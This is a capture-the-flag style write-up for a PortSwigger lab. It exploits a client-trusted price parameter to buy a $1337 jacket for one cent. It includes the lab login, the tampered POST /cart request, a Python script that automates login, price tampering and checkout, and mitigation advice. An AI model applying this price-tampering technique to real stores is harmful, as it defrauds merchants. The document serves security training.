#client_side #portswigger 

#### **Lab Objective**
- Exploit a business logic vulnerability to purchase a "Lightweight l33t Leather Jacket" for less than its listed price ($1337.00).
- Use credentials: `wiener:peter` (account balance: $100.00).

---

#### **Vulnerability Analysis**
- **Flaw**: The application trusts client-supplied input (item price) without server-side validation.
- **Impact**: Attackers can manipulate prices during checkout to purchase items at arbitrary costs.
- **Attack Surface**: `price` parameter in the `POST /cart` request.

---

#### **Exploitation Steps
1. **Log in** with credentials:
   - Username: `wiener`
   - Password: `peter`

2. **Add the jacket to cart**:
   - Product: "Lightweight l33t Leather Jacket" (listed price: $1337.00).
   - Intercept the `POST /cart` request using Burp Suite.

3. **Manipulate the price**:
   - Original request parameters:
     ```http
     POST /cart HTTP/1.1
     ...
     productId=1&quantity=1&price=133700  # $1337.00 in cents
     ```
   - Modify `price` to `1` (1 cent):
     ```http
     POST /cart HTTP/1.1
     ...
     productId=1&quantity=1&price=1
     ```

4. **Complete the purchase**:
   - Proceed to checkout (`POST /cart/checkout`).
   - The order succeeds since the manipulated price ($0.01) is below the user's balance ($100.00).

---

#### **Key Observations**
- **Server Blind Spot**: The backend processes the `price` value directly from the client without validation.
- **Logic Flaw**: Prices should be fetched from server-side databases, not client-supplied parameters.
- **Exploit Confirmation**: Lab solved after purchasing the jacket for 1 cent.

---

#### **Mitigation Recommendations**
1. **Server-Side Validation**:
   - Fetch item prices from a trusted server-side database during checkout.
   - Reject requests with mismatched prices.

2. **Business Logic Hardening**:
   - Implement checks to ensure prices match predefined values.
   - Use digital signatures for critical transactions.

3. **Client-Side Distrust**:
   - Treat client-side inputs as untrusted; use them for UI only, not business decisions.

---

#### **Python Automation Concept**
```python
import requests

TARGET_URL = "https://lab-id.web-security-academy.net"
CREDS = {"username": "wiener", "password": "peter"}
JACKET_ID = "1"  # Confirm in-lab

def exploit():
    session = requests.Session()
    
    # Authenticate
    session.post(f"{TARGET_URL}/login", data=CREDS)
    
    # Manipulate cart price (1 cent)
    cart_data = {"productId": JACKET_ID, "quantity": "1", "price": "1"}
    session.post(f"{TARGET_URL}/cart", data=cart_data)
    
    # Checkout
    checkout_response = session.post(f"{TARGET_URL}/cart/checkout")
    if "Congratulations" in checkout_response.text:
        print("[+] Lab solved!")
    else:
        print("[-] Exploit failed")

exploit()
```

> **Note**: Replace `TARGET_URL` and `JACKET_ID` with values from the live lab. Handle CSRF tokens if present.